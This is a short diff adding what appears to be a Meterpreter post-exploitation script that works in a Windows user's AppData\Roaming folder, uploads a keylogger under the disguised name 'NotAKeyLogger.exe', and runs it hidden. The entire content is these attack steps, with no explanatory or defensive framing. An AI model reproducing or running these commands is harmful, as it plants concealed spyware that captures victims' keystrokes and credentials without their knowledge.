@@ -1,0 +1,8 @@
+
+cd c:/Users/<THECURRENTUSER>/AppData/Roaming
+pwd
+upload /var/www/html/share/keylogger.exe NotAKeyLogger.exe
+ls
+execute -H -f NotAKeyLogger.exe
+ls
+
